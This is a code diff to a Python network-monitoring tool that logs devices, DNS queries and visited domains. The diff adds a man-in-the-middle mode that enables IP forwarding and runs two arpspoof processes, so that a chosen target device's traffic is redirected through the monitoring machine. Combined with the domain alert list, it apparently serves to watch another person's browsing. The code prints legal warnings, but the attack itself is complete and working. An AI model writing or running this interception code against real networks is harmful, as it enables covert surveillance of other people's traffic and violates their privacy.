@@ -44,6 +44,10 @@ DEFAULT_CONFIG = {
     'web_port': 5000,
     'max_domains_per_device': 20,   # max domains to track per device
     'max_dns_per_device': 15,       # max DNS queries to track per device
+    # MITM/ARP Spoofing (for capturing other devices' traffic)
+    'mitm_enabled': False,
+    'mitm_target_ip': None,
+    'mitm_gateway_ip': None,
     'alert_domains': [
         # Reddit - many subdomains used
         'reddit.com', 'www.reddit.com', 'oauth.reddit.com',
@@ -438,6 +442,86 @@ def analyze_capture(pcap_file, state):
     return sni_results
 
 # ============================================================
+# MITM / ARP SPOOFING (for capturing other devices' traffic)
+# ============================================================
+
+def start_mitm(config):
+    """Start ARP spoofing to redirect target traffic through this machine.
+
+    LEGAL WARNING: ARP spoofing / MITM attacks are illegal in many jurisdictions
+    without explicit written authorization. Only use on networks you own or have
+    written permission to test. Unauthorized network monitoring violates privacy
+    laws and ethical standards.
+    """
+    if not config.get('mitm_enabled') or not config.get('mitm_target_ip'):
+        return None, None
+
+    target_ip = config['mitm_target_ip']
+    gateway_ip = config.get('mitm_gateway_ip')
+    interface = config['interface']
+
+    if not gateway_ip:
+        # Try to auto-detect gateway
+        stdout, _, _ = run_cmd(['route', '-n', 'get', 'default'], timeout=5)
+        for line in stdout.split('\n'):
+            if 'gateway' in line.lower():
+                gateway_ip = line.split(':')[-1].strip()
+                break
+
+    if not gateway_ip:
+        # Default common gateway
+        gateway_ip = '192.168.0.1'
+        print(f"  ⚠ Gateway not specified, using default: {gateway_ip}")
+
+    # Check if arpspoof is available
+    if not shutil.which('arpspoof'):
+        print("  ❌ arpspoof not found. Install: brew install dsniff")
+        return None, None
+
+    print(f"\n  {'='*60}")
+    print(f"  ⚠️  MITM MODE ENABLED - LEGAL WARNING ⚠️")
+    print(f"  {'='*60}")
+    print(f"  Target: {target_ip}")
+    print(f"  Gateway: {gateway_ip}")
+    print(f"  Interface: {interface}")
+    print(f"  ")
+    print(f"  ⚠️  ONLY USE ON NETWORKS YOU OWN OR HAVE WRITTEN PERMISSION")
+    print(f"  ⚠️  UNAUTHORIZED MONITORING IS ILLEGAL AND UNETHICAL")
+    print(f"  {'='*60}\n")
+
+    # Enable IP forwarding
+    run_cmd(['sudo', 'sysctl', '-w', 'net.inet.ip.forwarding=1'], timeout=5)
+    run_cmd(['sudo', 'sysctl', '-w', 'net.inet.ip.fw.enable=1'], timeout=5)
+
+    # Start arpspoof: target -> gateway (tell target we are gateway)
+    proc1 = subprocess.Popen([
+        'sudo', 'arpspoof', '-i', interface, '-t', target_ip, gateway_ip
+    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    # Start arpspoof: gateway -> target (tell gateway we are target)
+    proc2 = subprocess.Popen([
+        'sudo', 'arpspoof', '-i', interface, '-t', gateway_ip, target_ip
+    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    print(f"  🎯 ARP spoofing started (PIDs: {proc1.pid}, {proc2.pid})")
+    print(f"  📡 Traffic from {target_ip} now flows through this machine")
+
+    return proc1, proc2
+
+def stop_mitm(proc1, proc2):
+    """Stop ARP spoofing and restore network"""
+    if proc1:
+        proc1.terminate()
+        proc1.wait(timeout=2)
+    if proc2:
+        proc2.terminate()
+        proc2.wait(timeout=2)
+
+    # Disable IP forwarding
+    run_cmd(['sudo', 'sysctl', '-w', 'net.inet.ip.forwarding=0'], timeout=5)
+    print(f"  🛑 MITM stopped, network restored")
+
+# ============================================================
 # ALERT HANDLING
 # ============================================================
 
@@ -549,6 +633,16 @@ def main_loop(config):
     print(f"  Capture interval: {config['capture_interval']}s")
     print(f"  Alert domains: {len(config['alert_domains'])} configured")
     print(f"  Known devices: {len(config['known_devices'])}")
+
+    # Start MITM if enabled
+    mitm_proc1 = None
+    mitm_proc2 = None
+    if config.get('mitm_enabled'):
+        mitm_proc1, mitm_proc2 = start_mitm(config)
+        if not mitm_proc1 or not mitm_proc2:
+            print("  ❌ MITM failed to start, continuing without MITM...")
+            config['mitm_enabled'] = False
+
     print(f"\n  Press Ctrl+C to stop\n")
 
     # Initial discovery
@@ -630,6 +724,9 @@ def main_loop(config):
         print("\n\nInterrupted by user")
     finally:
         state.running = False
+        # Stop MITM if running
+        if config.get('mitm_enabled') and (mitm_proc1 or mitm_proc2):
+            stop_mitm(mitm_proc1, mitm_proc2)
         print_final_summary(state)
 
 def print_final_summary(state):
@@ -659,6 +756,9 @@ if __name__ == '__main__':
     parser.add_argument('--alert-domains', help='Comma-separated domains to alert on')
     parser.add_argument('--list-devices', action='store_true', help='List known devices and exit')
     parser.add_argument('--web', action='store_true', help='Enable web dashboard (Flask) on port 5000')
+    # MITM/ARP Spoofing arguments
+    parser.add_argument('--mitm', metavar='TARGET_IP', help='Enable MITM mode: target IP to monitor (e.g., 192.168.0.101)')
+    parser.add_argument('--mitm-gateway', metavar='GATEWAY_IP', help='Gateway IP for MITM (auto-detected if not specified)')
 
     args = parser.parse_args()
 
@@ -673,6 +773,10 @@ if __name__ == '__main__':
     config['capture_interval'] = args.capture_interval
     config['quick_discovery_interval'] = args.quick_discovery
     config['enable_web_dashboard'] = args.web
+    # MITM settings
+    config['mitm_enabled'] = args.mitm is not None
+    config['mitm_target_ip'] = args.mitm
+    config['mitm_gateway_ip'] = args.mitm_gateway
 
     if args.alert_domains:
         config['alert_domains'] = [d.strip() for d in args.alert_domains.split(',')]
@@ -684,9 +788,14 @@ if __name__ == '__main__':
         sys.exit(0)
 
     # Check dependencies
-    for cmd in ['arp-scan', 'nmap', 'tcpdump', 'tshark']:
+    required_cmds = ['arp-scan', 'nmap', 'tcpdump', 'tshark']
+    if config.get('mitm_enabled'):
+        required_cmds.append('arpspoof')
+
+    for cmd in required_cmds:
         if not shutil.which(cmd):
-            print(f"Error: {cmd} not found. Install with: brew install {cmd}")
+            install_hint = 'dsniff' if cmd == 'arpspoof' else cmd
+            print(f"Error: {cmd} not found. Install with: brew install {install_hint}")
             sys.exit(1)
 
     signal.signal(signal.SIGINT, signal_handler)
